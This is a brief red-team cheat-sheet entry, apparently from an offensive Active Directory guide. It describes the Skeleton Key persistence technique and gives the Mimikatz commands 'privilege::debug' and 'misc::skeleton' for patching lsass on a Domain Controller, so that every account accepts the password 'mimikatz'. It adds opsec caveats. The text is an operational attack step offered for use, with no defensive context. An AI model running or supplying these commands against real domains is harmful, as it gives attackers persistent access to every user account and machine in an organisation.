Skeleton key is a persistence technique where it is possible to patch a
Domain Controller (lsass process) so that it allows access as any user
with a single password.

se the below command to inject a skeleton key (password would be
mimikatz) on a Domain Controller of choice. ***DA privileges required***
```
privilege::debug
misc::skeleton
```
Now, it is possible to access any machine with a valid username and
password as "mimikatz"

> [!NOTE]
  Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS
  